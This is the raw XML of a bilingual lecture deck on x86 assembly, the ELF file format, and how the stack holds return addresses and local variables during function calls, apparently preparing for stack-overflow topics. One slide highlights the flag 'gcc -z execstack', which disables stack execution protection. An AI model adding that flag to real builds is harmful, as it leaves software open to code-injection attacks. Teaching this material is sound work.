            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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 add </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>[ebp+8]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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 pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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 ret</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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7427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X86</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>汇编模型</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="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188021" y="1417638"/>
            <a:ext cx="3470805" cy="2209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CPU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79197" y="2043783"/>
            <a:ext cx="1310919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zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>程序计数器</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:latin typeface="Calibri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altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PC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013279" y="1722438"/>
            <a:ext cx="1371600" cy="762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zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>寄存器</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:latin typeface="Calibri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altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Register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6411426" y="1417638"/>
            <a:ext cx="1752600" cy="2209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Ctr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>内存 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Memory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511395" y="2052638"/>
            <a:ext cx="1447800" cy="13208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dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>代码 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>数据 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>栈 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Stack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>堆 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Heap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4658826" y="2052638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658826" y="2586038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4658826" y="3119438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4658826" y="1646238"/>
            <a:ext cx="1752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0" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>地址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4658826" y="2205038"/>
            <a:ext cx="1752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0" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>数据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658826" y="2738438"/>
            <a:ext cx="16764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0" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>指令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2850908" y="2636838"/>
            <a:ext cx="1682687" cy="685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 smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>条件状态码</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Condition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Codes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3013279" y="4300928"/>
            <a:ext cx="4195763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nsolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sum:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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 push </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>esp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>[ebp+12]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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 add </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>[ebp+8]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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 pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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 smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>   ret</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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2742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ELF</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>格式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2400" dirty="0" smtClean="0"/>
              <a:t>Executable and Linkable Format</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>3 main types of object files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>relocatable</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t> file: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>gcc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t> –c </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>test.c</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t> =&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>test.o</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>test.a</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>executable file: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>gcc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t> –o test </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>test.c</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t> =&gt; test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>shared object file: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>test.so</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Parallel views</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Linking View</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Execution View</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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193" y="3306602"/>
            <a:ext cx="4355935" cy="29484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7686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ELF Header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 l="-3069" r="-3069"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr/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66" y="1228200"/>
            <a:ext cx="2187321" cy="25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Section Header Table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13880"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2103119"/>
            <a:ext cx="8214713" cy="16084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57" y="1298206"/>
            <a:ext cx="2296859" cy="2836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35" y="1676461"/>
            <a:ext cx="8577044" cy="41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4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Program Header Table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 t="-41723" b="-41723"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="914869"/>
            <a:ext cx="8229600" cy="4525963"/>
          </a:xfr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8203"/>
            <a:ext cx="2392807" cy="27536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440311" y="3873236"/>
            <a:ext cx="341212" cy="227455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内容占位符 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4"/>
          <a:srcRect t="-617" b="-2829"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="329186" y="4372487"/>
            <a:ext cx="8357614" cy="213668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93766" y="4360942"/>
            <a:ext cx="1731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rgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gcc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>z </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execstack</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN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598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栈（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Stack</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>）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 smtClean="0"/>
              <a:t>数据结构中的概念先进后出</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>内存中的一块区域，用栈的结构来管理</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>从高地址向低地址增长</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>寄存器</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>esp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>代表栈顶（即最低栈地址）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>栈操作</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>压栈（入栈）</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>-&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>esp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>=esp-4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>弹栈（出栈）</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>esp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>=esp+4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>栈用于保存函数调用信息</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:latin typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>和局部变量</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"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622742"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5625834" y="4244216"/>
          <a:ext cx="1406958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695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byte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byte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byte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byte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组 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4514761" y="5743195"/>
            <a:ext cx="1069613" cy="369332"/>
            <a:chOff x="3672903" y="4941531"/>
            <a:chExt cx="1069613" cy="369332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="文本框 5"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3672903" y="4941531"/>
              <a:ext cx="792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 smtClean="0"/>
                <a:t>esp</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="7" name="直线箭头连接符 6"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4304632" y="5152190"/>
              <a:ext cx="43788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7656834" y="5716888"/>
            <a:ext cx="1936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栈顶，低地址</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="直线箭头连接符 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="7032792" y="5929084"/>
            <a:ext cx="60485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624275" y="4188035"/>
            <a:ext cx="172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栈底，高地址</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="直线箭头连接符 10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="7039594" y="4400975"/>
            <a:ext cx="60485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800085" y="6297033"/>
            <a:ext cx="123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栈示意图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830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栈与函数调用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+mn-ea"/>
              </a:rPr>
              <a:t>栈用于保存函数调用</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息和</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>局部变量</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr 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489038"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1857024" y="2514169"/>
          <a:ext cx="2579052" cy="12648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9052"/>
              </a:tblGrid>
              <a:tr h="327784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 smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>return address of </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" baseline="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>FunA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5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Local_A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3333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84805" y="2892405"/>
            <a:ext cx="29532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FunA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r>
              <a:rPr lang="en-US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   </a:t>
            </a:r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local_A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    </a:t>
            </a:r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FunB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FunB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r>
              <a:rPr lang="en-US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   </a:t>
            </a:r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local_B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;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"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FunC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();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"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Main() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US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   </a:t>
            </a:r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local_C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    </a:t>
            </a:r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FunA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dirty="0">
              <a:latin typeface="Consolas" charset="0"/>
              <a:ea typeface="Consolas" charset="0"/>
              <a:cs typeface="Consolas" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9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422206"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1857024" y="3779021"/>
          <a:ext cx="2579052" cy="12648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9052"/>
              </a:tblGrid>
              <a:tr h="327784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 smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>return address of </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" baseline="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>FunB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95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Local_B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53333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736636"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1857024" y="5043873"/>
          <a:ext cx="2579052" cy="12648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905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 smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>return address of </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" baseline="0" dirty="0" err="1" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>FunC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5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Local_C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3333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990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zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>整数寄存器（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>IA32</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p: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158850" y="1333501"/>
            <a:ext cx="5715000" cy="4533902"/>
            <a:chOff x="3984" y="1008"/>
            <a:chExt cx="1584" cy="2256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3984" y="1008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eax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984" y="1296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 smtClean="0">
                  <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>ecx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984" y="1584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 smtClean="0">
                  <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
